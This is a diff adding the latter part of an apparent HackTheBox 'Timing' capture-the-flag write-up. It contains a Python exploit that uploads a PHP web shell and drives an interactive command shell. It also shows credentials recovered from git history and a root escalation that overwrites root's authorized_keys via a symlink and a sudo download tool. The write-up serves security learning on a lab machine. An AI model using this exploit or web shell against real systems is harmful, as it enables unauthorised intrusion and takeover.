+    <span class="n">created_filename</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">"</span><span class="si">{</span><span class="nb">hash</span><span class="si">}</span><span class="s2">_</span><span class="si">{</span><span class="n">filename</span><span class="si">}</span><span class="s2">"</span>
+    <span class="k">return</span> <span class="n">created_filename</span>
+
+<span class="k">def</span> <span class="nf">pseudo_shell</span><span class="p">(</span><span class="n">url</span><span class="p">):</span>
+    <span class="n">response_reg</span> <span class="o">=</span> <span class="sa">r</span><span class="s1">'&lt;pre&gt;([\s\S]*)\n&lt;/pre&gt;'</span> <span class="c1"># anyting between pre tags</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s2">"[+] Starting pseudo shell. Type 'exit' to exit"</span><span class="p">)</span>
+    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+        <span class="n">inp</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s2">"&gt; "</span><span class="p">)</span>
+        <span class="k">if</span> <span class="n">inp</span> <span class="o">==</span> <span class="s1">'exit'</span><span class="p">:</span>
+            <span class="k">break</span>
+        <span class="k">elif</span> <span class="n">inp</span> <span class="o">==</span> <span class="s2">""</span><span class="p">:</span>
+            <span class="k">continue</span>
+
+        <span class="n">encoded</span> <span class="o">=</span> <span class="n">urllib</span><span class="o">.</span><span class="n">parse</span><span class="o">.</span><span class="n">quote</span><span class="p">(</span><span class="n">inp</span><span class="p">)</span>
+        <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="s2">"&amp;cmd="</span> <span class="o">+</span> <span class="n">encoded</span><span class="p">)</span>
+        <span class="n">received</span> <span class="o">=</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span>
+
+        <span class="n">matchObj</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span> <span class="n">response_reg</span><span class="p">,</span> <span class="n">received</span><span class="p">,</span> <span class="n">re</span><span class="o">.</span><span class="n">M</span><span class="o">|</span><span class="n">re</span><span class="o">.</span><span class="n">I</span><span class="p">)</span>
+        <span class="k">if</span><span class="p">(</span><span class="n">matchObj</span><span class="p">):</span>
+            <span class="nb">print</span><span class="p">(</span><span class="n">matchObj</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="nb">print</span><span class="p">(</span><span class="s2">"[failed] received length:"</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">received</span><span class="p">))</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s2">"Exiting..."</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">4</span><span class="p">:</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s2">"Missing parameters: python3 exploit.py &lt;target&gt; &lt;session_admin&gt; &lt;file_jpg&gt;"</span><span class="p">)</span>
+    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+<span class="n">host</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+<span class="n">cookie</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
+<span class="n">filename</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">"&lt;?php echo '&lt;h1&gt;use &amp;cmd=&lt;/h1&gt;&lt;pre&gt;' . shell_exec(urldecode($_GET['cmd'])) . '&lt;/pre&gt;';?&gt;"</span>
+
+<span class="n">target</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">"http://</span><span class="si">{</span><span class="n">host</span><span class="si">}</span><span class="s2">"</span>
+<span class="n">url_upload</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">"</span><span class="si">{</span><span class="n">target</span><span class="si">}</span><span class="s2">/upload.php"</span>
+<span class="n">url_lfi</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">"</span><span class="si">{</span><span class="n">target</span><span class="si">}</span><span class="s2">/image.php?img=./images/uploads/"</span>
+
+<span class="c1"># upload file</span>
+<span class="n">response_upload</span> <span class="o">=</span> <span class="n">upload</span><span class="p">(</span><span class="n">url_upload</span><span class="p">,</span> <span class="n">filename</span><span class="p">,</span> <span class="n">cookie</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+
+<span class="c1"># find correct url</span>
+<span class="n">url_webshell</span> <span class="o">=</span> <span class="kc">None</span>
+<span class="n">timestamp</span> <span class="o">=</span> <span class="n">phptime</span><span class="p">()</span>
+
+<span class="k">for</span> <span class="n">iterator</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="o">-</span><span class="mi">2</span><span class="p">,</span> <span class="mi">10</span><span class="p">):</span>
+    <span class="n">possible_filename</span> <span class="o">=</span> <span class="n">figure_filename</span><span class="p">(</span><span class="n">timestamp</span> <span class="o">+</span> <span class="n">iterator</span><span class="p">,</span> <span class="n">filename</span><span class="p">)</span>
+    <span class="n">possible_url</span> <span class="o">=</span> <span class="n">url_lfi</span> <span class="o">+</span> <span class="n">possible_filename</span>
+    <span class="n">check_res</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">possible_url</span><span class="p">)</span>
+    <span class="n">response_size</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">check_res</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+
+    <span class="nb">print</span><span class="p">(</span><span class="n">iterator</span><span class="p">,</span> <span class="n">possible_url</span><span class="p">,</span> <span class="n">check_res</span><span class="p">,</span> <span class="n">response_size</span><span class="p">)</span>
+
+    <span class="k">if</span> <span class="n">response_size</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">"[+] FOUND!!!"</span><span class="p">)</span>
+        <span class="n">url_webshell</span> <span class="o">=</span> <span class="n">possible_url</span>
+        <span class="k">break</span>
+
+<span class="k">if</span> <span class="ow">not</span> <span class="n">url_webshell</span><span class="p">:</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s2">"[-] Did not find a working url. Increase range on very slow connections."</span><span class="p">)</span>
+    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+<span class="c1"># start webshell handler</span>
+<span class="n">pseudo_shell</span><span class="p">(</span><span class="n">url_webshell</span><span class="p">)</span>
+</code></pre></div></div></div>
+<p>The session string needs to be for an upgraded account.</p>
+<div class="breaker"><div class="repairman"><div class="highlight"><pre><span></span><code>$ python3 exploit.py <span class="m">10</span>.10.11.135 <span class="s1">'PHPSESSID=gbdbhroavkbgihookd36f4ikns'</span> smile.jpg
+</code></pre></div></div></div>
+<p><div class="breaker breaker-image"><div class="repairman"><img alt="Pseudo Shell" src="/assets/img/timing_63_pseudo_shell.png"/></div></div></p>
+<h2 id="user-shell">User Shell<a class="headerlink" href="#user-shell" title="Permanent link"> </a></h2>
+<p>The database file for the webapp contains MySQL credentials:</p>
+<div class="breaker"><div class="repairman"><div class="highlight"><pre><span></span><code>&gt; cat /var/www/html/db_conn.php
+&lt;?php
+<span class="nv">$pdo</span> <span class="o">=</span> new PDO<span class="o">(</span><span class="s1">'mysql:host=localhost;dbname=app'</span>, <span class="s1">'root'</span>, <span class="s1">'4_V3Ry_l0000n9_p422w0rd'</span><span class="o">)</span><span class="p">;</span>
+</code></pre></div></div></div>
+<p>Sadly the database does not contain anything useful and that password is not re-used elsewhere.</p>
+<p>But there is a backup of the webapp in <code>/opt/source-files-backup.zip</code>.</p>
+<p>Unzip it to <code>/tmp/</code> and you will find a <code>.git</code> repository directory.</p>
+<div class="breaker"><div class="repairman"><div class="highlight"><pre><span></span><code>&gt; mkdir /tmp/blub
+&gt; unzip /opt/source-files-backup.zip -d /tmp/blub
+&gt;
+&gt; ls -al /tmp/blub/backup
+total <span class="m">76</span>
+drwxr-xr-x <span class="m">6</span> www-data www-data <span class="m">4096</span> Jul <span class="m">20</span>  <span class="m">2021</span> .
+drwxr-xr-x <span class="m">3</span> www-data www-data <span class="m">4096</span> Apr <span class="m">25</span> <span class="m">19</span>:45 ..
+drwxr-xr-x <span class="m">8</span> www-data www-data <span class="m">4096</span> Jul <span class="m">20</span>  <span class="m">2021</span> .git
+-rw-r--r-- <span class="m">1</span> www-data www-data  <span class="m">200</span> Jul <span class="m">20</span>  <span class="m">2021</span> admin_auth_check.php
+-rw-r--r-- <span class="m">1</span> www-data www-data  <span class="m">373</span> Jul <span class="m">20</span>  <span class="m">2021</span> auth_check.php
+-rw-r--r-- <span class="m">1</span> www-data www-data <span class="m">1268</span> Jul <span class="m">20</span>  <span class="m">2021</span> avatar_uploader.php
+drwxr-xr-x <span class="m">2</span> www-data www-data <span class="m">4096</span> Jul <span class="m">20</span>  <span class="m">2021</span> css
+-rw-r--r-- <span class="m">1</span> www-data www-data   <span class="m">92</span> Jul <span class="m">20</span>  <span class="m">2021</span> db_conn.php
+-rw-r--r-- <span class="m">1</span> www-data www-data <span class="m">3937</span> Jul <span class="m">20</span>  <span class="m">2021</span> footer.php
+-rw-r--r-- <span class="m">1</span> www-data www-data <span class="m">1498</span> Jul <span class="m">20</span>  <span class="m">2021</span> header.php
+-rw-r--r-- <span class="m">1</span> www-data www-data  <span class="m">507</span> Jul <span class="m">20</span>  <span class="m">2021</span> image.php
+drwxr-xr-x <span class="m">3</span> www-data www-data <span class="m">4096</span> Jul <span class="m">20</span>  <span class="m">2021</span> images
+-rw-r--r-- <span class="m">1</span> www-data www-data  <span class="m">188</span> Jul <span class="m">20</span>  <span class="m">2021</span> index.php
+drwxr-xr-x <span class="m">2</span> www-data www-data <span class="m">4096</span> Jul <span class="m">20</span>  <span class="m">2021</span> js
+-rw-r--r-- <span class="m">1</span> www-data www-data <span class="m">2074</span> Jul <span class="m">20</span>  <span class="m">2021</span> login.php
+-rw-r--r-- <span class="m">1</span> www-data www-data  <span class="m">113</span> Jul <span class="m">20</span>  <span class="m">2021</span> logout.php
+-rw-r--r-- <span class="m">1</span> www-data www-data <span class="m">3041</span> Jul <span class="m">20</span>  <span class="m">2021</span> profile.php
+-rw-r--r-- <span class="m">1</span> www-data www-data <span class="m">1740</span> Jul <span class="m">20</span>  <span class="m">2021</span> profile_update.php
+-rw-r--r-- <span class="m">1</span> www-data www-data  <span class="m">984</span> Jul <span class="m">20</span>  <span class="m">2021</span> upload.php
+</code></pre></div></div></div>
+<p>The commit log shows an interesting entry about an update in <code>db_conn.php</code>:</p>
+<div class="breaker"><div class="repairman"><div class="highlight"><pre><span></span><code>&gt; git --no-pager -C /tmp/blub/backup log
+
+commit 16de2698b5b122c93461298eab730d00273bd83e
+Author: grumpy &lt;grumpy@localhost.com&gt;
+Date:   Tue Jul <span class="m">20</span> <span class="m">22</span>:34:13 <span class="m">2021</span> +0000
+
+    db_conn updated
+
+commit e4e214696159a25c69812571c8214d2bf8736a3f
+Author: grumpy &lt;grumpy@localhost.com&gt;
+Date:   Tue Jul <span class="m">20</span> <span class="m">22</span>:33:54 <span class="m">2021</span> +0000
+
+    init
+</code></pre></div></div></div>
+<p>Restore the previous commit and you will find a different password in the file:</p>
+<div class="breaker"><div class="repairman"><div class="highlight"><pre><span></span><code>&gt; git --no-pager -C /tmp/blub/backup checkout e4e214696159a25c69812571c8214d2bf8736a3f
+&gt;
+&gt; cat /tmp/blub/backup/db_conn.php
+&lt;?php
+<span class="nv">$pdo</span> <span class="o">=</span> new PDO<span class="o">(</span><span class="s1">'mysql:host=localhost;dbname=app'</span>, <span class="s1">'root'</span>, <span class="s1">'S3cr3t_unGu3ss4bl3_p422w0Rd'</span><span class="o">)</span><span class="p">;</span>
+</code></pre></div></div></div>
+<p>This is also the SSH password for user <code>aaron</code>.</p>
+<div class="breaker"><div class="repairman"><div class="highlight"><pre><span></span><code>$ ssh aaron@10.10.11.135
+password: S3cr3t_unGu3ss4bl3_p422w0Rd
+</code></pre></div></div></div>
+<h2 id="root">Root<a class="headerlink" href="#root" title="Permanent link"> </a></h2>
+<p>The Privilege Escalation is rather straight forward.</p>
+<div class="breaker"><div class="repairman"><div class="highlight"><pre><span></span><code>aaron@timing:~$ sudo -l
+Matching Defaults entries <span class="k">for</span> aaron on timing:
+    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/ur/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
+
+User aaron may run the following commands on timing:
+    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /usr/bin/netutils
+</code></pre></div></div></div>
+<p><code>sudo /usr/bin/netutils</code> allows you to download a file into the current working directory with root permissions.</p>
+<p>On your own machine generate private and public SSH keys:</p>
+<div class="breaker"><div class="repairman"><div class="highlight"><pre><span></span><code>ssh-keygen -t rsa -b <span class="m">4096</span> -f ./id_rsa
+</code></pre></div></div></div>
+<p>Rename the public key to some custom name.</p>
+<div class="breaker"><div class="repairman"><div class="highlight"><pre><span></span><code>mv id_rsa.pub muesli
+</code></pre></div></div></div>
+<p>Start an http server in the directory where your keys are located.</p>
+<div class="breaker"><div class="repairman"><div class="highlight"><pre><span></span><code>$ sudo python3 -m http.server <span class="m">80</span>
+Serving HTTP on <span class="m">0</span>.0.0.0 port <span class="m">80</span> <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
+</code></pre></div></div></div>
+<p>On the target create a symbolic link to root's authorized_keys file with the same name as your renamed public key.</p>
+<div class="breaker"><div class="repairman"><div class="highlight"><pre><span></span><code>aaron@timing:~$ ln -s /root/.ssh/authorized_keys muesli
+</code></pre></div></div></div>
+<p>Use netutils to overwrite the symlink filename with your public key.</p>
+<div class="breaker"><div class="repairman"><div class="highlight"><pre><span></span><code>aaron@timing:~$ sudo /usr/bin/netutils
+netutils v0.1
+Select one option:
+<span class="o">[</span><span class="m">0</span><span class="o">]</span> FTP
+<span class="o">[</span><span class="m">1</span><span class="o">]</span> HTTP
+<span class="o">[</span><span class="m">2</span><span class="o">]</span> Quit
+Input &gt;&gt; <span class="m">1</span>
+Enter Url: http://&lt;yourip&gt;/muesli
+</code></pre></div></div></div>
+<p>The root file will be overwritten and you can sign in as root via SSH with your generated private key.</p>
+<div class="breaker"><div class="repairman"><div class="highlight"><pre><span></span><code>ssh root@10.10.11.135 -i ./id_rsa
+</code></pre></div></div></div>
+                    <div class="article-meta">
+                        <section class="article-share-section">
+                            <a href="https://twitter.com/intent/tweet?text=HackTheBox%20-%20Timing%20https%3A%2F%2Fsecoats.github.io%2Fposts%2Fhtb_timing.html" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>
+                            <a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fsecoats.github.io%2Fposts%2Fhtb_timing.html" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>
+                            <a href="https://www.linkedin.com/shareArticle?mini=true&url=https%3A%2F%2Fsecoats.github.io%2Fposts%2Fhtb_timing.html" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
+                          </section>
+                        <section class="article-meta-section">
+                            <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+                            <span itemprop="keywords">
+                                <a href="/tags.html#hackthebox" class="article-tag" rel="tag">hackthebox</a><span class="sep"> </span>
+                                <a href="/tags.html#linux" class="article-tag" rel="tag">linux</a><span class="sep"> </span>
+                                <a href="/tags.html#web" class="article-tag" rel="tag">web</a><span class="sep"> </span>
+                                <a href="/tags.html#exploit" class="article-tag" rel="tag">exploit</a><span class="sep"> </span>
+                            </span>
+                        </section>
+                        <section class="article-meta-section">
+                            <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+                            <span itemprop="keywords">
+                                <a href="/categories.html#writeup" class="article-tag" rel="tag">writeup</a>
+                            </span>
+                        </section>
+                        <section class="article-meta-section">
+                            <span style="margin-right:1em;"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Published:</strong> <time datetime="2022-06-05 16:00:00">June 05, 2022</time></span>
+                    
+                        </section> 
+                        <section class="article-meta-section">
+                            
+                            <span><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Last Updated:</strong> <time datetime="2022-06-05 16:00:00">June 05, 2022</time></span>
+                        </section>
+                    </div>
+                </article>
+            </main>
+            <div id="footerbar">
+                <footer class="wrapper">
+                    <div class="footer-info">
+                        <ul class="social-icons">
+    <li><a href="https://github.com/secoats" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub</a></li>
+    <!--<li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>-->
+    <li><a href="https://twitter.com/cybercereals" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i> Twitter</a></li>
+</ul>
+<div class="copyright-notice">© 2021 secoats</div>
+                    </div>
+                </footer>
+            </div>
+        </div>
+        <script src="/assets/js/main.js"></script>
+    </body>
+</html>
